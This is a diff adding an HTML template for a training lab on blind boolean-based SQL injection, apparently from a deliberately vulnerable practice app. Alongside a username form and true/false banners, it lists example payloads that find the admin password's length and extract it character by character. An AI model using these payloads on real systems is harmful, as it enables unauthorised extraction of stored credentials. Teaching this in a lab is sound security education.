@@ -1,0 +1,86 @@
+{% extends "base.html" %}
+{% block title %}Lab 06 — Blind Boolean SQLi{% endblock %}
+{% block content %}
+
+<div class="breadcrumb">
+  <a href="/">Home</a><span>›</span>
+  <span style="color:#e6edf3;">Lab 06 — Blind Boolean-Based SQLi</span>
+</div>
+
+<div class="card">
+  <div class="card-header">
+    <div style="width:36px;height:36px;background:#1a0808;border:1px solid #e63946;border-radius:4px;
+                display:flex;align-items:center;justify-content:center;
+                font-family:'Syne',sans-serif;font-weight:800;font-size:16px;color:#e63946;flex-shrink:0;">06</div>
+    <div>
+      <h2>{{ lab.title }}</h2>
+      <div style="font-size:11px;color:#8b949e;margin-top:2px;">{{ lab.description }}</div>
+    </div>
+  </div>
+  <div class="lab-meta">
+    <span class="tag tag-red">⚠ Vulnerable</span>
+    <span class="tag tag-blue">GET · ?username</span>
+    <span class="tag tag-green">Goal: {{ lab.goal }}</span>
+  </div>
+</div>
+
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-bottom:1rem;">
+
+  <div class="card">
+    <div style="font-family:'Syne',sans-serif;font-weight:700;color:#e6edf3;margin-bottom:1rem;">🔍 Username Lookup</div>
+    <form method="GET">
+      <div class="form-row">
+        <label>Username</label>
+        <input type="text" name="username" value="{{ username }}" placeholder="e.g. admin">
+      </div>
+      <button type="submit" class="btn btn-red">Check →</button>
+    </form>
+
+    {% if exists is not none %}
+    <div style="margin-top:1.25rem;">
+      {% if exists %}
+      <div class="banner banner-success" style="font-size:16px; text-align:center; padding:1.5rem;">
+        ✅ <strong>User Found</strong><br>
+        <span style="font-size:11px; opacity:.8;">Your injected condition was TRUE</span>
+      </div>
+      {% else %}
+      <div class="banner banner-fail" style="font-size:16px; text-align:center; padding:1.5rem;">
+        ❌ <strong>User Not Found</strong><br>
+        <span style="font-size:11px; opacity:.8;">Your injected condition was FALSE</span>
+      </div>
+      {% endif %}
+    </div>
+    {% endif %}
+
+    {% if raw_sql %}
+    <div style="margin-top:1rem;">
+      <div style="font-size:10px;color:#8b949e;text-transform:uppercase;letter-spacing:.06em;margin-bottom:.4rem;">Generated SQL</div>
+      <div class="sql-box">{{ raw_sql }}</div>
+    </div>
+    {% endif %}
+  </div>
+
+  <div class="card">
+    <div style="font-family:'Syne',sans-serif;font-weight:700;color:#e6edf3;margin-bottom:1rem;">💉 Blind Extraction Payloads</div>
+
+    <div style="font-size:11px;color:#8b949e;margin-bottom:.5rem;">Step 1 — find password length:</div>
+    <div class="payload-block"><code>admin' AND LENGTH(password)>5--</code></div>
+    <div class="payload-block" style="margin-top:.4rem;"><code>admin' AND LENGTH(password)=12--</code></div>
+
+    <div style="font-size:11px;color:#8b949e;margin:.75rem 0 .5rem;">Step 2 — extract char by char:</div>
+    <div class="payload-block"><code>admin' AND SUBSTR(password,1,1)='s'--</code></div>
+    <div class="payload-block" style="margin-top:.4rem;"><code>admin' AND SUBSTR(password,2,1)='u'--</code></div>
+
+    <details style="margin-top:.75rem;">
+      <summary>▶ Show hint</summary>
+      <div class="hint-body">{{ lab.hint }}</div>
+    </details>
+    <div style="margin-top:1rem;">
+      <div style="font-size:10px;color:#8b949e;text-transform:uppercase;letter-spacing:.06em;margin-bottom:.4rem;">✅ Safe Version</div>
+      <div class="sql-box safe">{{ lab.safe_version }}</div>
+    </div>
+  </div>
+
+</div>
+
+{% endblock %}
